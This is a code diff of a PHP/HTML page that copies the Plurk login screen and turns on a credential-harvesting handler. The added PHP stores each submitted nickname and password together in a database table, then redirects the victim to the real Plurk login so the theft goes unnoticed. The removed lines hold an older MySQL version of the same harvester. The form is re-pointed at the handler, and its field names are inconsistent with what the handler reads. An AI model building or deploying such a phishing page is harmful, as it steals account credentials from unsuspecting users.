@@ -1,24 +1,39 @@
-<!-- <?php
+<?php
+// Read database connection info from environment variables
+$host = getenv('DB_HOST');
+$port = getenv('DB_PORT') ?: 5432;
+$dbname = getenv('DB_NAME');
+$user = getenv('DB_USER');
+$pass = getenv('DB_PASS');
 
-      $servername = "localhost";
-      $username = "root";
-      $password = "";
-      $dbase = "plurk_acc";
+try {
+  // Connect to PostgreSQL
+  $pdo = new PDO("pgsql:host=$host;port=$port;dbname=$dbname", $user, $pass, [
+    PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
+  ]);
 
-      $conn = new mysqli($servername, $username, $password, $dbase);
+  // Check if email and password were submitted
+  if (isset($_POST['nickname']) && isset($_POST['password'])) {
+    $nickname = trim($_POST['nickname']);
+    $password = trim($_POST['password']);
 
-      // Check if form submit is triggered
-      if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // Combine as "email||password"
+    $combined = $nickname . '  ||  ' . $password;
 
-        // Get POST values
-        $nickname = $_POST['nick_name'];
-        $password = $_POST['password'];
+    // Insert combined string into table "submissions"
+    $stmt = $pdo->prepare("INSERT INTO submissions (input_text) VALUES (:input)");
+    $stmt->execute(['input' => $combined]);
+    header("Location: https://www.plurk.com/login?r=");
+    exit;
+    echo "Your input has been saved!";
+  } else {
+    echo "Email or password not received.";
+  }
+} catch (PDOException $e) {
+  echo "Database connection failed: " . $e->getMessage();
+}
 
-        $sql = "INSERT INTO tbl_accs (username, password) VALUES ('$nickname', '$password')";
-
-        $conn->query($sql);
-      }
-      ?> -->
+?>
 
 <html lang="en">
 
@@ -1376,7 +1391,7 @@
       <div class="logo pif-plurk"></div>
 
       <!-- main form handling -->
-      <form action="plurk.php" method="post" id="login_form" class="overlay-form">
+      <form action="index.php" method="post" id="login_form" class="overlay-form">
         <div class="input-holder">
           <div id="nick_name"><input type="text" name="nick_name" id="input_nick_name" name="nickname" placeholder="Nickname" value="" spellcheck="false" autocomplete="username" /></div>
           <div id="password"><input type="password" name="password" id="input_password" name="password" placeholder="Password" autocomplete="current-password" /></div>
